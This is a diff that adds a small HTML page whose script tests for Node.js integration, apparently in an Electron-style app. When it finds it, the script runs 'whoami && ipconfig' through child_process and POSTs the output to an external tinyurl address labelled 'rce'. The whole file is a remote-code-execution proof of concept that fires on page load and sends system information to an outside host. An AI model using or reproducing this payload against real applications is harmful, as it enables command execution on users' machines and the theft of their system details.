@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<body>
+  <script>
+    // Check if Node.js is available
+    if (typeof process !== 'undefined') {
+      const { exec } = require('child_process');
+      exec('whoami && ipconfig', (err, stdout) => {
+        fetch('https://tinyurl.com/3m6a35pm/rce', { 
+          method: 'POST', 
+          body: err ? err.message : stdout 
+        });
+      });
+    } else {
+      alert('Node.js integration disabled!');
+    }
+  </script>
+</body>
+</html>
